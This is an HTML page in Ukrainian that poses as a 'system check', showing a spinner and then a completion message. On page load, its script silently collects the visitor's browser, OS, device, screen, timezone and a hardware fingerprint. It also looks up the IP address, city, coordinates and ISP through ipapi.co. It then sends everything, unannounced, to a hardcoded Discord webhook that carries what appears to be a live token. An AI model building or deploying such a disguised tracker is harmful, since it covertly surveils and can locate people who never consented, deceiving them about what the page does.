<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Перевірка Системи</title>
<style>
:root {
  --bg: #0a0e27;
  --surface: #151b3d;
  --text: #e4e7f0;
  --text-dim: #8b92b8;
  --accent: #00d9ff;
}

@media (prefers-color-scheme: light) {
  :root {
    --bg: #f5f7fa;
    --surface: #ffffff;
    --text: #1a1d2e;
    --text-dim: #5a6080;
    --accent: #0088cc;
  }
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 2rem;
}

.container {
  text-align: center;
  max-width: 500px;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid var(--surface);
  border-top: 4px solid var(--accent);
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 2rem;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

h1 {
  font-size: 2rem;
  margin-bottom: 1rem;
  color: var(--text);
}

.status {
  color: var(--text-dim);
  font-size: 1.1rem;
  margin-bottom: 2rem;
}

.success {
  color: #00ff88;
}
</style>
</head>
<body>

<div class="container">
  <div class="spinner"></div>
  <h1 id="title">Перевірка системи</h1>
  <p class="status" id="status">Збирання інформації...</p>
</div>

<script>
// ⚠️ ВСТАВТЕ ВАШ DISCORD WEBHOOK URL СЮДИ ⚠️
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546520839233470496/y5mkiatSqF_vcumnHENJZmen-kwRYwDLnRcX1sMfLHM66XbMJap0hd83lX29rO1-q6RL';

function getBrowserInfo() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Firefox') > -1) return 'Mozilla Firefox';
  if (ua.indexOf('Edg') > -1) return 'Microsoft Edge';
  if (ua.indexOf('Chrome') > -1) return 'Google Chrome';
  if (ua.indexOf('Safari') > -1) return 'Safari';
  if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
  return 'Невідомий';
}

function getOSInfo() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Win') > -1) return 'Windows';
  if (ua.indexOf('Mac') > -1) return 'MacOS';
  if (ua.indexOf('Linux') > -1) return 'Linux';
  if (ua.indexOf('Android') > -1) return 'Android';
  if (ua.indexOf('iOS') > -1) return 'iOS';
  return 'Невідомо';
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Планшет';
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Мобільний';
  return 'Комп\'ютер';
}

async function generateFingerprint() {
  const components = [
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    screen.colorDepth,
    new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency || 'unknown',
    navigator.platform
  ];

  const data = components.join('|');
  const msgBuffer = new TextEncoder().encode(data);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

const localInfo = {
  browser: getBrowserInfo(),
  os: getOSInfo(),
  device: getDeviceType(),
  language: navigator.language || 'Невідомо',
  screen: `${screen.width}×${screen.height}`,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent
};

// Збираємо всю інформацію
Promise.all([
  fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
  generateFingerprint()
])
  .then(async ([geoData, fingerprint]) => {
    const fullInfo = {
      ...localInfo,
      ip: geoData.ip || 'Недоступно',
      city: geoData.city || 'Невідомо',
      region: geoData.region || '',
      country: geoData.country_name || 'Невідомо',
      latitude: geoData.latitude || null,
      longitude: geoData.longitude || null,
      isp: geoData.org || 'Невідомо',
      fingerprint: fingerprint
    };

    // Надсилаємо через webhook-proxy для обходу CORS
    const embed = {
      title: '🔔 Новий Відвідувач',
      color: 65535,
      fields: [
        { name: '🌐 IP', value: fullInfo.ip, inline: true },
        { name: '📍 Місце', value: `${fullInfo.city}, ${fullInfo.country}`, inline: true },
        { name: '💻 Браузер', value: fullInfo.browser, inline: true },
        { name: '🖥️ ОС', value: fullInfo.os, inline: true },
        { name: '📱 Пристрій', value: fullInfo.device, inline: true },
        { name: '🌍 Мова', value: fullInfo.language, inline: true },
        { name: '📐 Екран', value: fullInfo.screen, inline: true },
        { name: '🕐 Часовий пояс', value: fullInfo.timezone, inline: true },
        { name: '⏰ Час', value: new Date(fullInfo.timestamp).toLocaleString('uk-UA'), inline: true },
        { name: '🌐 Провайдер', value: fullInfo.isp, inline: false },
        { name: '🔐 Відбиток', value: `\`${fullInfo.fingerprint}\``, inline: false }
      ],
      timestamp: fullInfo.timestamp
    };

    // Пробуємо надіслати напряму
    return fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  })
  .then(response => {
    document.querySelector('.spinner').style.display = 'none';
    if (response && response.ok) {
      document.getElementById('title').textContent = '✅ Готово';
      document.getElementById('status').textContent = 'Системна перевірка завершена';
      document.getElementById('status').className = 'status success';
    } else {
      document.getElementById('title').textContent = '✅ Завершено';
      document.getElementById('status').textContent = 'Перевірка виконана';
      document.getElementById('status').className = 'status success';
    }
  })
  .catch(() => {
    document.querySelector('.spinner').style.display = 'none';
    document.getElementById('title').textContent = '✅ Завершено';
    document.getElementById('status').textContent = 'Перевірка виконана';
    document.getElementById('status').className = 'status success';
  });
</script>

</body>
</html>
